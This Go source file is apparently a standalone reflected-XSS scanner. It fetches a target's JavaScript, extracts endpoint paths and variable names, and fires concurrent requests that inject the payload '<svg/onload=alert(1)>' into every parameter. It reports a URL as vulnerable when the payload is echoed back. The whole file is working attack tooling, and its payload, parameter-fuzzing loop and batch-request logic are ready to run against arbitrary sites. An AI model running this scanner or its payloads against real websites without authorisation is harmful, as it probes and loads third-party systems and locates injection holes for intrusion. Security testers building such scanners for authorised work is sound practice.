package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"
	"time"
	"regexp"
)

func extractVariables(jsCode string) []string {
	variableRegex := regexp.MustCompile(`(?:var|let|const)\s+([a-zA-Z_][a-zA-Z0-9_]*)`)
	matches := variableRegex.FindAllStringSubmatch(jsCode, -1)
	variableSet := make(map[string]bool)

	for _, match := range matches {
		variableName := match[1]
		variableSet[variableName] = true
	}

	var variables []string
	for variable := range variableSet {
		variables = append(variables, variable)
	}

	return variables
}

func extractBaseURL(fullURL string) string {
	parsedURL, err := url.Parse(fullURL)
	if err != nil {
		fmt.Println("Error parsing URL:", err)
		return ""
	}
	return parsedURL.Hostname()
}

func combineParameters(variables []string) string {
	var paramList []string
	for _, variable := range variables {
		encodedValue := url.QueryEscape("<svg/onload=alert(1)>") // Encode your actual parameter value here
		paramList = append(paramList, fmt.Sprintf("%s=%s", variable, encodedValue))
	}
	return strings.Join(paramList, "&")
}

func extractEndpoints(jsCode string) []string {
	endpointRegex := regexp.MustCompile(`/[^\s'"}{)(,^]+|[^/\s'"}{)(,^]+/[^\s'"}{)(,^]+|(https?://[^\s'"}{)(,^]+)`)
	matches := endpointRegex.FindAllString(jsCode, -1)
	endpoints := make([]string, len(matches))

	for i, match := range matches {
		if strings.HasPrefix(match, "http://") || strings.HasPrefix(match, "https://") {
			match = strings.TrimPrefix(match, "http://")
			match = strings.TrimPrefix(match, "https://")
		}
		match = strings.ReplaceAll(match, "//", "/")
		endpoints[i] = match
	}

	return endpoints
}

func splitIntoBatches(variables []string, batchSize int) [][]string {
	var batches [][]string

	for i := 0; i < len(variables); i += batchSize {
		end := i + batchSize
		if end > len(variables) {
			end = len(variables)
		}

		batch := variables[i:end]
		batches = append(batches, batch)
	}

	return batches
}

func processURL(url string) {
	client := http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Get(url)
	if err != nil {
		fmt.Println("Error fetching new URL:", err)
		return
	}
	defer resp.Body.Close()

	newBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading new response body:", err)
		return
	}

	if strings.Contains(string(newBody), "<svg/onload=alert(1)>") {
		fmt.Printf("URL Vulnerable to XSS : \"%s\"\n", url)
	} else {
		fmt.Printf("Not Vulnerable to XSS : \"%s\"\n", url)
	}
}

func processURLWithTimeout(url string, wg *sync.WaitGroup, semaphore chan struct{}) {
	defer func() {
		<-semaphore
		wg.Done()
	}()

	processURL(url)
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <URL>")
		return
	}

	url := os.Args[1]

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error fetching remote JavaScript:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}

	jsCode := string(body)
	endpoints := extractEndpoints(jsCode)
	variables := extractVariables(jsCode)

	baseURL := extractBaseURL(url)
	if baseURL == "" {
		fmt.Println("Error extracting base URL")
		return
	}

	urlScheme := resp.Request.URL.Scheme

	uniqueEndpoints := make(map[string]bool)
	var modifiedEndpoints []string
	for _, endpoint := range endpoints {
		endpoint = strings.ReplaceAll(endpoint, "./", "/")
		if !strings.HasPrefix(endpoint, "/") {
			endpoint = "/" + endpoint
		}
		if !uniqueEndpoints[endpoint] {
			uniqueEndpoints[endpoint] = true
			modifiedEndpoints = append(modifiedEndpoints, endpoint)
		}
	}

	baseURLPattern := strings.ReplaceAll(baseURL, ".", "\\.")
	sedCmd := fmt.Sprintf("s|^/%s||; s/:.*//; /\\*/d; /\\]/d; /\\[/d; /</d; />/d; /\\$/d; /\\;/d; /\\|/d; /\\}/d; /\\{/d; /\\(/d; /\\)/d; /\\!/d; /\\,/d", baseURLPattern)

	cmd := exec.Command("sed", "-E", sedCmd)
	cmd.Stdin = strings.NewReader(strings.Join(modifiedEndpoints, "\n"))
	output, err := cmd.CombinedOutput()

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			if status, ok := exitErr.Sys().(syscall.WaitStatus); ok && status.ExitStatus() != 1 {
				fmt.Println("Error running sed:", err)
				return
			}
		}
	}

	filteredOutput := []string{}
	for _, line := range strings.Split(string(output), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && line != "/" {
			filteredOutput = append(filteredOutput, line)
		}
	}

	think := strings.Join(filteredOutput, "\n")

	// Split variables into batches of 60
	batchSize := 60
	variableBatches := splitIntoBatches(variables, batchSize)

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10) // Limit the number of concurrent requests

	for _, endpoint := range strings.Split(think, "\n") {
		for _, batch := range variableBatches {
			paramString := combineParameters(batch)
			newURL := fmt.Sprintf("%s://%s%s?%s", urlScheme, baseURL, endpoint, paramString)

			wg.Add(1)
			semaphore <- struct{}{} // Acquire a slot from the semaphore

			go processURLWithTimeout(newURL, &wg, semaphore)
		}
	}

	wg.Wait() // Wait for all goroutines to finish
}
